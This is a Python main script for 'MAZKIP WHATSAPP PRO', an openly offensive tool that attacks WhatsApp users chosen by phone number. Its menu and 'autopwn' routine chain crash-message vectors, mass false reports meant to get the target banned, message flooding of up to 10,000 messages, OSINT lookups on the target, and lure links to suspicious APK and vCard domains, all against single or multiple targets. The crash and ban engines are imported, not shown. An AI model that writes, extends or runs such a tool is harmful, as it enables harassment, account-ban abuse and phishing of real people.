#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, time, random, json
from pathlib import Path
sys.path.insert(0, str(Path.home()/"mazkip-whatsapp-pro"))
from colorama import Fore, Style, init; init(autoreset=True)
R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; C=Fore.CYAN; W=Fore.WHITE; H=Style.BRIGHT; N=Style.NORMAL

from modules.banner import print_banner, print_disclaimer, print_menu, loading_anim
from modules.crash import CrashEngine
from modules.ban import BanEngine
from modules.osint import OSINTEngine
from modules.connector import WhatsAppConnector
from modules.utils import *

class MWP:
    def __init__(self):
        self.crash=CrashEngine(); self.ban=BanEngine(); self.osint=OSINTEngine()
        self.conn=WhatsAppConnector(); self.running=True

    def _loading(self):
        os.system('clear')
        arts = [f"{R}{H}██╗░░░░░░█████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░",
                f"{R}{H}██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░",
                f"{R}{H}██║░░░░░██║░░██║██║░░██║██║░░██║██║██╔██╗██║██║░░██╗░",
                f"{R}{H}██║░░░░░██║░░██║██║░░██║██║░░██║██║██║╚████║██║░░╚██╗",
                f"{R}{H}███████╗╚█████╔╝╚█████╔╝██████╔╝██║██║░╚███║╚██████╔╝",
                f"{R}{H}╚══════╝░╚════╝░░╚════╝░╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░"]
        for a in arts: print(a); time.sleep(0.1)
        print(f"{Y}{H}       Loading...\n")
        loading_anim("Engines"); loading_anim("Vectors"); loading_anim("Ready!",0.2); time.sleep(1)

    def _target(self):
        p = input(f"{Y}Target (62xxx) > {W}").strip()
        v = self.conn.validate_phone(p)
        if v: print(f"{G}[✓] {v}"); return v
        print(f"{R}[!] Invalid!"); return None

    def run(self):
        init_dirs(); self._loading(); print_banner(); print_disclaimer()
        while self.running:
            try:
                print_banner(); print_menu()
                c = input(f"\n{R}{H}┌─[{W}M4zk1Play@MWP{R}{H}]\n└──╼ {W}$ ").strip()
                if c in ('01','1'): self.m_crash()
                elif c in ('02','2'): self.m_ban()
                elif c in ('03','3'): self.m_osint()
                elif c in ('04','4'): self.m_spam()
                elif c in ('05','5'): self.m_media()
                elif c in ('06','6'): self.m_multi()
                elif c in ('07','7'): self.m_session()
                elif c in ('08','8'): self.m_autopwn()
                elif c in ('09','9'): self.m_about()
                elif c in ('00','0'): self.exit()
                else: print(f"{R}[!] Invalid!"); time.sleep(1)
            except KeyboardInterrupt: self.exit()
            except Exception as e: print(f"{R}[!] {e}"); input("Enter...")

    def m_crash(self):
        p = self._target()
        if not p: return
        self.crash.list_vectors()
        v = input(f"{Y}Vector (1-7) or 0=ALL > {W}").strip()
        if v == '0': self.crash.send_all(p, self.conn)
        elif v in '1234567': self.crash.send(p, int(v), self.conn)
        input("Enter...")

    def m_ban(self):
        p = self._target()
        if not p: return
        print(f"\n{R}{H}[1] Report 50x  [2] Report 100x  [3] Custom  [4] Trigger  [5] Combo{R}")
        c = input(f"> {W}").strip()
        if c == '1': self.ban.mass_report(p, 50)
        elif c == '2': self.ban.mass_report(p, 100)
        elif c == '3':
            n = input(f"{Y}Count > {W}").strip()
            self.ban.mass_report(p, int(n) if n.isdigit() else 50)
        elif c == '4': self.ban.spam_trigger(p, self.conn)
        elif c == '5':
            print(f"{R}{H}[!] COMBO!"); self.ban.spam_trigger(p, self.conn); time.sleep(5); self.ban.mass_report(p, 100)
        input("Enter...")

    def m_osint(self):
        p = self._target()
        if p: self.osint.check_phone(p); self.osint.save(p)
        input("Enter...")

    def m_spam(self):
        p = self._target()
        if not p: return
        n = input(f"{Y}Count (100-10000) > {W}").strip()
        n = max(100, min(10000, int(n) if n.isdigit() else 100))
        self.conn.send_multiple(p, self.crash.v.get('v1','SPAM')[:500], n)
        input("Enter...")

    def m_media(self):
        p = self._target()
        if not p: return
        self.conn.send_message(p, f"⚠️ SCAN VIRUS: https://virustotal-scanner.xyz/apk/{random.randint(1000,9999)}")
        time.sleep(2)
        self.conn.send_message(p, f"📇 KONTAK: https://vcard-generator.xyz/card_{random.randint(1000,9999)}.vcf")
        print(f"{G}[✓] Media links sent!")
        input("Enter...")

    def m_multi(self):
        print(f"\n{R}{H}[1] Add  [2] List  [3] Clear  [4] Attack crash  [5] Attack ban{R}")
        c = input(f"> {W}").strip()
        if c == '1':
            p = input(f"{Y}Number > {W}").strip()
            v = self.conn.validate_phone(p)
            if v: add_target(v)
        elif c == '2': list_targets()
        elif c == '3':
            if input(f"{R}Sure? (y/N){W}").strip().lower() == 'y': clear_targets()
        elif c == '4':
            for t in load_targets():
                print(f"{Y}[*] {t}"); self.crash.send_all(t, self.conn); time.sleep(3)
        elif c == '5':
            for t in load_targets(): self.ban.mass_report(t, 30); time.sleep(3)
        input("Enter...")

    def m_session(self):
        sp = Path.home()/"mazkip-whatsapp-pro"/"sessions"/"chrome_data"
        print(f"{G}[✓] Session exists!" if sp.exists() else f"{Y}[!] No session")
        print(f"{C}[*] Mode: {self.conn.mode.upper()}")
        input("Enter...")

    def m_autopwn(self):
        p = self._target()
        if not p: return
        if input(f"{R}{H}Run FULL ATTACK? (y/N){W}").strip().lower() != 'y': return
        print(f"{Y}STEP 1/6: OSINT"); self.osint.check_phone(p); self.osint.save(p); countdown(3)
        print(f"{Y}STEP 2/6: CRASH"); self.crash.send_all(p, self.conn); countdown(3)
        print(f"{Y}STEP 3/6: SPAM"); self.conn.send_multiple(p, self.crash.v.get('v1','')[:200], 200); countdown(3)
        print(f"{Y}STEP 4/6: MEDIA"); self.conn.send_message(p, f"⚠️ SCAN: https://virustotal-scanner.xyz/apk/{random.randint(1000,9999)}"); countdown(3)
        print(f"{Y}STEP 5/6: TRIGGER"); self.ban.spam_trigger(p, self.conn); countdown(3)
        print(f"{Y}STEP 6/6: REPORT"); self.ban.mass_report(p, 100)
        print(f"\n{R}{H}🔥 DONE! Target: {p} — CRASH + BAN RISK!{N}")
        out = Path.home()/"mazkip-whatsapp-pro"/"output"/f"attack_{p}_{int(time.time())}.json"
        json.dump({"target":p,"time":time.strftime('%Y-%m-%d %H:%M:%S'),"status":"done"}, open(out,'w'), indent=4)
        print(f"{G}[✓] Report: {out}")
        input("Enter...")

    def m_about(self):
        print(f"\n{R}{H}╔{'═'*50}╗\n║{' ' * 14}MAZKIP WHATSAPP PRO v2.0{' ' * 13}║\n╠{'═'*50}╣\n║  Author: M4zk1Play Nusantara              ║\n║  Team: ANONIMUS CYBER NUSANTARA            ║\n║  7 Crash | Ban Engine | OSINT | Spam      ║\n║  Media Bomber | Multi Target | Auto PWN   ║\n╚{'═'*50}╝")
        input("Enter...")

    def exit(self): print(f"\n{R}{H}GASKEN! — M4zk1Play Nusantara{N}"); self.running=False; sys.exit(0)

if __name__ == "__main__":
    try: MWP().run()
    except KeyboardInterrupt: print(f"\n{R}[!] Bye.{N}"); sys.exit(0)
